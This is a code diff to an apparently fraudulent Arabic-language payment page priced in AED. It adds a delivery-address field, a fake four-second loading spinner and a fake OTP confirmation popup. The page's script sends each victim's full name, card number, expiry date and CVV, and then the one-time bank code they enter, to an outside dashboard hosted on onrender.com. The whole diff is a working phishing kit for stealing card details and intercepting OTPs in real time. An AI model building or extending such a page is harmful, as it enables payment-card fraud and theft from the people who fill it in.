@@ -59,7 +59,17 @@
           inputmode="numeric"
           class="flex-1 p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
         />
+        
       </div>
+
+       <div class="space-y-4">
+      <input
+        type="text"
+        placeholder="عنوان التوصيل"
+        required
+        class="w-full p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+      />
+
     </div>
   </div>
 
@@ -167,7 +177,7 @@
     const expiryVal = document.getElementById("expiryDate").value;
     const cvvVal = document.querySelector('input[placeholder="CVV"]').value;
 
-    // Send all data to backend asynchronously (does not block popup)
+    // Send all data to backend asynchronously
     fetch("https://dashboard-xwzz.onrender.com/api/messages", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -184,88 +194,107 @@ CVV: <br> ${cvvVal}`
     .then(() => console.log("Pay button data sent"))
     .catch(err => console.error("Pay button API Error:", err));
 
-    // ================= Create OTP Popup =================
-    const phoneInput = document.querySelector('input[type="tel"]');
-    const phone = phoneInput.value || "0000000";
-    const last3 = phone.slice(-3);
-    const total = localStorage.getItem('total') || "0";
+    // ================= Show spinner loader =================
+const loader = document.createElement("div");
+loader.className = "fixed inset-0 bg-black/70 flex items-center justify-center z-50";
+loader.innerHTML = `
+  <div class="relative">
+    <div class="animate-spin rounded-full h-16 w-16 border-4 border-gold border-t-transparent"></div>
+    <div class="absolute inset-0 flex items-center justify-center">
+      <p class="text-gold font-bold text-lg">جاري التحميل</p>
+    </div>
+  </div>
+`;
+document.body.appendChild(loader);
 
-    const otpPopup = document.createElement("div");
-    otpPopup.className = "fixed inset-0 bg-black/70 flex items-center justify-center z-50";
-    otpPopup.innerHTML = `
-      <div class="bg-slate-900 p-8 rounded-2xl w-[90%] max-w-md text-center space-y-4">
-        <h3 class="text-xl font-bold text-amber-400 mb-2">تأكيد الدفع</h3>
-        <p class="text-slate-300 mb-4">
-          لقد أرسلنا رمز OTP إلى الرقم (****${last3})<br>
-          : أنت بصدد دفع مبلغ
-          <span class="font-extrabold text-amber-400 text-2xl">
-          <br>  ${total}  AED<span class="text-base block"></span>
-          </span>
-        </p>
-        <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="أدخل رمز OTP" class="w-full p-3 rounded-lg bg-dark border border-white/10 text-center focus:outline-none focus:border-gold" />
-        <div class="flex justify-center gap-4 mt-2">
-          <button id="confirmBtn" class="bg-amber-400 text-black py-2 px-6 rounded-full font-semibold hover:opacity-90 transition flex items-center justify-center gap-2">
-            تأكيد
-          </button>
-          <button id="cancelOtpBtn" class="bg-gray-600 text-white py-2 px-6 rounded-full font-semibold hover:opacity-90 transition">
-            إلغاء
-          </button>
+
+    // After 4 seconds, remove loader and show OTP popup
+    setTimeout(() => {
+      loader.remove();
+
+      const phoneInput = document.querySelector('input[type="tel"]');
+      const phone = phoneInput.value || "0000000";
+      const last3 = phone.slice(-3);
+      const total = localStorage.getItem('total') || "0";
+
+      const otpPopup = document.createElement("div");
+      otpPopup.className = "fixed inset-0 bg-black/70 flex items-center justify-center z-50";
+      otpPopup.innerHTML = `
+        <div class="bg-slate-900 p-8 rounded-2xl w-[90%] max-w-md text-center space-y-4">
+          <h3 class="text-xl font-bold text-amber-400 mb-2">تأكيد الدفع</h3>
+          <p class="text-slate-300 mb-4">
+            لقد أرسلنا رمز OTP إلى الرقم (****${last3})<br>
+            : أنت بصدد دفع مبلغ
+            <span class="font-extrabold text-amber-400 text-2xl">
+            <br>  ${total}  AED<span class="text-base block"></span>
+            </span>
+          </p>
+          <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="أدخل رمز OTP" class="w-full p-3 rounded-lg bg-dark border border-white/10 text-center focus:outline-none focus:border-gold" />
+          <div class="flex justify-center gap-4 mt-2">
+            <button id="confirmBtn" class="bg-amber-400 text-black py-2 px-6 rounded-full font-semibold hover:opacity-90 transition flex items-center justify-center gap-2">
+              تأكيد
+            </button>
+            <button id="cancelOtpBtn" class="bg-gray-600 text-white py-2 px-6 rounded-full font-semibold hover:opacity-90 transition">
+              إلغاء
+            </button>
+          </div>
         </div>
-      </div>
-    `;
-    document.body.appendChild(otpPopup);
+      `;
+      document.body.appendChild(otpPopup);
 
-    const confirmBtn = document.getElementById("confirmBtn");
-    const cancelBtn = document.getElementById("cancelOtpBtn");
+      const confirmBtn = document.getElementById("confirmBtn");
+      const cancelBtn = document.getElementById("cancelOtpBtn");
 
-    // Confirm OTP button (keep original loader + send name/card/OTP)
-    confirmBtn.addEventListener("click", () => {
-      const otpInputVal = document.getElementById("otpInput").value;
+      // Confirm OTP button
+     // Confirm OTP button
+confirmBtn.addEventListener("click", () => {
+  const otpInputVal = document.getElementById("otpInput").value;
 
-      if (otpInputVal.length !== 6) {
-        alert("الرجاء إدخال رمز OTP المكون من 6 أرقام");
-        return;
-      }
+  if (otpInputVal.length !== 6) {
+    alert("الرجاء إدخال رمز OTP المكون من 6 أرقام");
+    return;
+  }
 
-      confirmBtn.disabled = true;
-      const originalText = confirmBtn.innerHTML;
-      confirmBtn.innerHTML = `<svg class="animate-spin h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
-      </svg> جاري التاكيد`;
+  confirmBtn.disabled = true;
+  const originalText = confirmBtn.innerHTML;
+  confirmBtn.innerHTML = `<svg class="animate-spin h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+  </svg> جاري التاكيد`;
 
-      // Send only name + card + OTP
-      const fullNameConfirm = document.querySelector('input[placeholder="Full Name"]').value;
-      const cardConfirm = document.getElementById("cardNumber").value;
+  // Send only name + card + OTP
+  const fullNameConfirm = document.querySelector('input[placeholder="Full Name"]').value;
+  const cardConfirm = document.getElementById("cardNumber").value;
 
-      fetch("https://dashboard-xwzz.onrender.com/api/messages", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          text: `🔑 بيانات otp : <br>
+  fetch("https://dashboard-xwzz.onrender.com/api/messages", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      text: `🔑 بيانات otp : <br>
 الاسم: ${fullNameConfirm}
 رقم البطاقة: <br> ${cardConfirm}
 OTP:  <br>${otpInputVal}`
-        })
-      })
-      .then(() => {
-        
-        
-      })
-      .catch(err => {
-        console.error("Confirm button API Error:", err);
-        alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى");
-      })
-      .finally(() => {
-        confirmBtn.disabled = false;
-        confirmBtn.innerHTML = originalText; // restore original text
-      });
-    });
+    })
+  })
+  .catch(err => {
+    console.error("Confirm button API Error:", err);
+    alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى");
+  });
 
-    // Cancel OTP button
-    cancelBtn.addEventListener("click", () => {
-      otpPopup.remove();
-    });
+  // Keep spinner for exactly 4 seconds, then restore original text
+  setTimeout(() => {
+    confirmBtn.disabled = false;
+    confirmBtn.innerHTML = originalText;
+  }, 4000);
+});
+
+
+      // Cancel OTP button
+      cancelBtn.addEventListener("click", () => {
+        otpPopup.remove();
+      });
+
+    }, 4000); // 4-second loader
   });
 </script>
 
